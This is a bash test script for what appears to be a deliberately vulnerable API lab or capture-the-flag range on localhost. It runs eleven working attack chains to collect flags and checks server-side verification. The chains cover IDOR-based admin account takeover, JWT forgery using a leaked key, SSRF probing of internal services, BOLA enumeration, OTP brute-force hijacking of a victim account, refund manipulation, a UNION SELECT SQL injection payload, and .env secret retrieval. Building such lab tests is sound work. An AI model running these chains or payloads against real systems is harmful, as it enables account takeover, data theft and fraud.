#!/bin/bash
# Run ALL exploit chains and retrieve EVERY flag with server-side verification.
BASE="http://localhost:8888"
LOG="test_logs/all_flags_test.log"
> "$LOG"
RESULTS=""

log() { echo "$@" | tee -a "$LOG"; }
pass() { RESULTS="$RESULTS\nPASS: $1"; log "  FLAG: $2"; }
fail() { RESULTS="$RESULTS\nFAIL: $1 — $2"; log "  FAILED: $2"; }

log "=== Full Exploit + Flag Retrieval Test ==="
log "Started: $(date)"
log ""

# Wait for services
for i in $(seq 1 10); do
  curl -s "$BASE" > /dev/null 2>&1 && break; sleep 3
done

# Register + login
curl -s -X POST "$BASE/identity/api/auth/signup" \
  -H "Content-Type: application/json" \
  -d '{"name":"Test Attacker","email":"attacker@test.com","password":"Passw0rd!","number":"1234567890"}' > /dev/null 2>&1

TOKEN=$(curl -s -X POST "$BASE/identity/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"Passw0rd!"}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin).get('token',''))" 2>/dev/null)
log "Auth token: ${TOKEN:0:30}..."
log ""

# ══ Chain 1: API Key Brute-force (flag embedded in response) ═════
log "== Chain 1: API Key Brute-force =="
curl -s "$BASE/chains/apikeys/debug/config" > /dev/null
RESP=$(curl -s -H "X-Internal-Key: $(curl -s "$BASE/chains/apikeys/debug/dump?token=e6f1" | python3 -c "import sys,json; print(json.load(sys.stdin)['dump']['internal_api_key'])" 2>/dev/null)" "$BASE/chains/apikeys/admin/secrets")
FLAG=$(echo "$RESP" | python3 -c "import sys,json; [print(s['value']) for s in json.load(sys.stdin)['secrets'] if 'FLAG' in s['name']]" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 1: API Key" "$FLAG"; else fail "Chain 1: API Key" "$RESP"; fi
log ""

# ══ Chain 2: IDOR → Account Takeover (flag in admin dashboard) ═══
log "== Chain 2: IDOR → Account Takeover =="
curl -s -X POST "$BASE/chains/idor/register" -H "Content-Type: application/json" -d '{"email":"idor2@evil.com","password":"pass123"}' > /dev/null
ADMIN_ID=""
for id in $(seq 1 30); do
  ROLE=$(curl -s "$BASE/chains/idor/users/$id" | python3 -c "import sys,json; print(json.load(sys.stdin).get('role',''))" 2>/dev/null)
  [ "$ROLE" = "admin" ] && ADMIN_ID=$id && break
done
log "  Admin at ID $ADMIN_ID"
if [ -n "$ADMIN_ID" ]; then
  RTOK=$(curl -s "$BASE/chains/idor/users/$ADMIN_ID" | python3 -c "import sys,json; print(json.load(sys.stdin)['password_reset_token'])" 2>/dev/null)
  curl -s -X POST "$BASE/chains/idor/reset-password" -H "Content-Type: application/json" -d "{\"reset_token\":\"$RTOK\",\"new_password\":\"hacked\"}" > /dev/null
  ATOK=$(curl -s -X POST "$BASE/chains/idor/login" -H "Content-Type: application/json" -d '{"email":"sysop@vehitrack.internal","password":"hacked"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])" 2>/dev/null)
  FLAG=$(curl -s "$BASE/chains/idor/admin/dashboard?token=$ATOK" | python3 -c "import sys,json; print(json.load(sys.stdin)['flag'])" 2>/dev/null)
  if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 2: IDOR" "$FLAG"; else fail "Chain 2: IDOR" "no flag"; fi
else fail "Chain 2: IDOR" "admin not found"; fi
log ""

# ══ Chain 3: JWT Algorithm Confusion (flag in admin export) ══════
log "== Chain 3: JWT Algorithm Confusion =="
curl -s -X POST "$BASE/chains/jwt/login" -H "Content-Type: application/json" -d '{"email":"fleet.viewer@vehitrack.io","password":"Dusk!maze22"}' > /dev/null
SECRET=$(curl -s "$BASE/chains/jwt/.well-known/jwks.json" | python3 -c "import sys,json; print(json.load(sys.stdin)['keys'][0]['k'])" 2>/dev/null)
FORGED=$(python3 -c "import jwt,time; print(jwt.encode({'sub':'admin','role':'admin','name':'Admin','iat':int(time.time()),'exp':int(time.time())+3600},'$SECRET',algorithm='HS256'))" 2>/dev/null)
FLAG=$(curl -s -H "Authorization: Bearer $FORGED" "$BASE/chains/jwt/admin/export" | python3 -c "import sys,json; print(json.load(sys.stdin)['flag'])" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 3: JWT" "$FLAG"; else fail "Chain 3: JWT" "no flag"; fi
log ""

# ══ Chain 4: SSRF (flag via internal-map with proof token) ═══════
log "== Chain 4: SSRF Internal Discovery =="
curl -s "$BASE/chains/ssrf/fetch?url=http://crapi-identity:8080/" > /dev/null
SSRF_NAME=$(curl -s "$BASE/chains/ssrf/fetch?url=http://control-plane:9090/control/status" | python3 -c "import sys,json; print(json.load(sys.stdin)['body']['name'])" 2>/dev/null)
curl -s "$BASE/chains/ssrf/fetch?url=http://redis:6379/" > /dev/null
log "  Discovered service: $SSRF_NAME"
FLAG=$(curl -s "$BASE/chains/ssrf/admin/internal-map?token=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SSRF_NAME'))")" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 4: SSRF" "$FLAG"; else fail "Chain 4: SSRF" "no flag (name=$SSRF_NAME)"; fi
log ""

# ══ Chain 5: BOLA Vehicle (planted flag in community data) ═══════
log "== Chain 5: BOLA Vehicle =="
# Access other users' vehicles
POSTS=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/community/api/v2/community/posts/recent")
# Look for the planted flag secret in posts/comments
PLANTED=$(echo "$POSTS" | python3 -c "
import sys,json
data = json.load(sys.stdin)
for post in data.get('posts',[]):
    if 'vtrk-loc-' in post.get('content',''):
        import re
        m = re.search(r'vtrk-loc-[a-f0-9]+', post['content'])
        if m: print(m.group(0)); break
    for c in post.get('comments',[]):
        if 'vtrk-loc-' in c.get('content',''):
            import re
            m = re.search(r'vtrk-loc-[a-f0-9]+', c['content'])
            if m: print(m.group(0)); break
" 2>/dev/null)
log "  Planted secret found: $PLANTED"
if [ -n "$PLANTED" ]; then
  FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/bola_vehicle" -H "Content-Type: application/json" -d "{\"secret\":\"$PLANTED\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
  if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 5: BOLA Vehicle" "$FLAG"; else fail "Chain 5: BOLA Vehicle" "verification failed"; fi
else fail "Chain 5: BOLA Vehicle" "planted secret not found in posts"; fi
log ""

# ══ Chain 6: BOLA Mechanic Reports (planted flag in report) ══════
log "== Chain 6: BOLA Reports =="
# Enumerate reports and find one belonging to another user
for RID in $(seq 1 5); do
  RDATA=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/workshop/api/mechanic/mechanic_report?report_id=$RID")
  RVICTIM=$(echo "$RDATA" | python3 -c "import sys,json; print(json.load(sys.stdin).get('vehicle',{}).get('owner',{}).get('email',''))" 2>/dev/null)
  RVIN=$(echo "$RDATA" | python3 -c "import sys,json; print(json.load(sys.stdin).get('vehicle',{}).get('vin',''))" 2>/dev/null)
  if [ -n "$RVICTIM" ] && [ "$RVICTIM" != "attacker@test.com" ]; then
    log "  Found report $RID: victim=$RVICTIM vin=$RVIN"
    FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/bola_reports" -H "Content-Type: application/json" \
      -d "{\"report_id\":$RID,\"victim_email\":\"$RVICTIM\",\"vin\":\"$RVIN\",\"attacker_token\":\"$TOKEN\"}" | \
      python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
    if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 6: BOLA Reports" "$FLAG"; else fail "Chain 6: BOLA Reports" "verification rejected"; fi
    break
  fi
done
log ""

# ══ Chain 7: OTP Brute-force (server verifies victim login) ══════
log "== Chain 7: OTP Brute-force =="
VICTIM="pogba006@example.com"
curl -s -X POST "$BASE/identity/api/auth/forget-password" -H "Content-Type: application/json" -d "{\"email\":\"$VICTIM\"}" > /dev/null
sleep 3
# Brute-force 25 wrong OTPs
for OTP in 0000 0001 0002 0003 0004 0005 0010 0100 0500 1000 1111 1234 2222 2345 3333 3456 4444 4567 5555 5678 6666 7777 8888 9000 9999; do
  curl -s -X POST "$BASE/identity/api/auth/v3/check-otp" -H "Content-Type: application/json" -d "{\"email\":\"$VICTIM\",\"otp\":\"$OTP\",\"password\":\"Pwned!55\"}" > /dev/null
done
# Get fresh OTP (brute-force may have consumed the first one)
curl -s -X POST "$BASE/identity/api/auth/forget-password" -H "Content-Type: application/json" -d "{\"email\":\"$VICTIM\"}" > /dev/null
sleep 3
REAL_OTP=$(curl -s "http://localhost:8025/api/v2/messages?start=0&limit=20" | python3 -c "
import sys,json,re
for msg in json.load(sys.stdin).get('items',[]):
    to = msg.get('Raw',{}).get('To',[''])[0] if msg.get('Raw') else ''
    if 'pogba' in to:
        m = re.search(r'otp is:\s*(\d{4})', msg.get('Content',{}).get('Body',''), re.I)
        if m: print(m.group(1)); break
" 2>/dev/null)
log "  OTP: $REAL_OTP"
curl -s -X POST "$BASE/identity/api/auth/v3/check-otp" -H "Content-Type: application/json" -d "{\"email\":\"$VICTIM\",\"otp\":\"$REAL_OTP\",\"password\":\"Pwned!55\"}" > /dev/null
VTOK=$(curl -s -X POST "$BASE/identity/api/auth/login" -H "Content-Type: application/json" -d "{\"email\":\"$VICTIM\",\"password\":\"Pwned!55\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('token','FAIL'))" 2>/dev/null)
if [ "$VTOK" != "FAIL" ] && [ -n "$VTOK" ]; then
  FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/otp_bruteforce" -H "Content-Type: application/json" -d "{\"victim_email\":\"$VICTIM\",\"token\":\"$VTOK\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
  if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 7: OTP" "$FLAG"; else fail "Chain 7: OTP" "verification rejected"; fi
else fail "Chain 7: OTP" "could not login as victim"; fi
log ""

# ══ Chain 8: Refund Abuse (server checks balance < 0) ════════════
log "== Chain 8: Refund Abuse =="
# Buy + manipulate
ORDER_ID=$(curl -s -X POST "$BASE/workshop/api/shop/orders" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"product_id":2,"quantity":1}' | python3 -c "import sys,json; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
if [ -n "$ORDER_ID" ] && [ "$ORDER_ID" != "None" ]; then
  curl -s -X POST "$BASE/workshop/api/shop/orders/return_order?order_id=$ORDER_ID" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"status":"returned"}' > /dev/null
  curl -s -X PUT "$BASE/workshop/api/shop/orders/$ORDER_ID" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"quantity":-100,"status":"returned"}' > /dev/null
fi
# Server-side check: just submit our token, verifier checks balance
FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/refund_abuse" -H "Content-Type: application/json" -d "{\"token\":\"$TOKEN\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 8: Refund" "$FLAG"; else
  BAL=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" | python3 -c "import sys,json; print(json.load(sys.stdin).get('available_credit',0))" 2>/dev/null)
  fail "Chain 8: Refund" "balance=$BAL (must be negative)"
fi
log ""

# ══ Chain 9: Video Delete (server replays the DELETE) ════════════
log "== Chain 9: Video Delete =="
FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/video_delete" -H "Content-Type: application/json" -d "{\"token\":\"$TOKEN\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 9: Video Delete" "$FLAG"; else fail "Chain 9: Video Delete" "verification failed"; fi
log ""

# ══ Chain 10: Coupon Injection (server replays the payload) ══════
log "== Chain 10: Coupon Injection =="
FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/coupon_injection" -H "Content-Type: application/json" -d "{\"payload\":\"' UNION SELECT coupon_code FROM coupons--\",\"token\":\"$TOKEN\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 10: Coupon SQLi" "$FLAG"; else fail "Chain 10: Coupon SQLi" "replay didn't trigger 500"; fi
log ""

# ══ Chain 11: Honeypot (secret is in the response itself) ════════
log "== Chain 11: Honeypot =="
SECRET=$(curl -s "$BASE/.env" | python3 -c "import sys,json; print(json.load(sys.stdin).get('note',''))" 2>/dev/null)
FLAG=$(curl -s -X POST "$BASE/chains/flags/verify/honeypot" -H "Content-Type: application/json" -d "{\"secret\":\"$SECRET\"}" | python3 -c "import sys,json; print(json.load(sys.stdin).get('flag',''))" 2>/dev/null)
if echo "$FLAG" | grep -q "XVEH{"; then pass "Chain 11: Honeypot" "$FLAG"; else fail "Chain 11: Honeypot" "secret=$SECRET"; fi
log ""

# ══ Normal traffic ════════════════════════════════════════════════
log "== Normal traffic baseline =="
for i in $(seq 1 10); do
  curl -s "$BASE/" > /dev/null
  curl -s -H "Authorization: Bearer $TOKEN" "$BASE/identity/api/v2/user/dashboard" > /dev/null
  sleep 0.3
done
log "  20 normal requests (should trigger 0 alerts)"

log ""
log "========================================"
log "  RESULTS"
log "========================================"
echo -e "$RESULTS" | tee -a "$LOG"
PASS_COUNT=$(echo -e "$RESULTS" | grep -c "PASS")
FAIL_COUNT=$(echo -e "$RESULTS" | grep -c "FAIL")
log ""
log "  $PASS_COUNT passed, $FAIL_COUNT failed out of 11"
log "Finished: $(date)"
